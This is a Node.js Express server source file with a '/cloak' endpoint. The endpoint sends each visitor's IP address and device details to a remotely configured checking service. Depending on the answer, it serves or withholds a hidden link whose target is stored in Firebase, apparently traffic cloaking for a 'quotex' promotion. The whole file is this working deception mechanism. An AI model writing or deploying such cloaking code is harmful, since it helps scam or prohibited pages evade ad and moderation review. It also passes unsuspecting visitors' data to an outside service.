import { initializeApp } from 'firebase/app';
import { fileURLToPath } from 'url';
import { getFirestore, collection, getDocs } from 'firebase/firestore';
import { getDatabase, ref, onValue } from "firebase/database";
import axios from 'axios';
import { dirname } from 'path';
import express from 'express';
import bodyParser from 'body-parser';
import cors from 'cors';
import parser from 'ua-parser-js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);

const app = express();
const port = 80;

const firebaseConfig = {
    projectId: 'sdf79abhj4b2jhb',
    databaseURL: "https://quotex-d1649-default-rtdb.europe-west1.firebasedatabase.app",
  };

const firestore = initializeApp(firebaseConfig);

app.use(bodyParser());
app.use(cors());

app.get('/', async (req, res) => {
    return res.sendFile(__dirname + "/index.html");
})

app.get('/cloak', (req, res) => {
    const db = getDatabase();
    const starCountRef = ref(db, 'schema');
    const ua = parser(req.headers['user-agent']);
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress
    console.log(ip);

    onValue(starCountRef, (snapshot) => {
        const data = snapshot.val();
        console.log(data);

        if(data?.enabled === 1){
            let url = `${data?.cloak}`
            let temp = `
            ip=${ip}&
            systemName=${ua?.os.name}&
            systemVersion=${ua?.os.version}&
            model=${ua?.device.model}`

            console.log(url);
            console.log(ua);
            axios.get(url, {params: {ip: ip, systemName: ua?.os.name, systemVersion: ua?.os.version, model: ua?.device.model}}).then(response => {
                console.log("RESULT: ", response.data);
                if(+response.data === 1){
                    res.send({'status': 1, link: data?.link})
                }else{
                    res.send({'status': 0})
                }
            })
          }else{
            res.send({'status': 0})
          }
    });
})

app.listen(port, () => {
    console.log(`Example app listening on port ${port}`)
})


